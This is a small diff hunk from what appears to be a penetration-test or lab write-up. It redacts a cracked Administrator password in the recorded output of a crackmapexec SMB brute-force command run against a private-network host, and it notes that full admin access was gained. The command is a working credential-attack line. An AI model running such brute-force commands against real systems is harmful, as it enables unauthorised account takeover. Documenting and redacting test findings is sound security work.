@@ -166,7 +166,7 @@ Launched a credential brute force attack against the Administrator account over 
 
 ```bash
 crackmapexec smb 192.168.128.162 -u administrator -p /tmp/passwords.txt
-# Result: [+] Nayak_RO\administrator:2020 (Pwn3d!)
+# Result: [+] Nayak_RO\administrator:**** (Pwn3d!)
 ```
 
 **Results:** Credential compromised in 12 attempts | Full admin SMB access gained
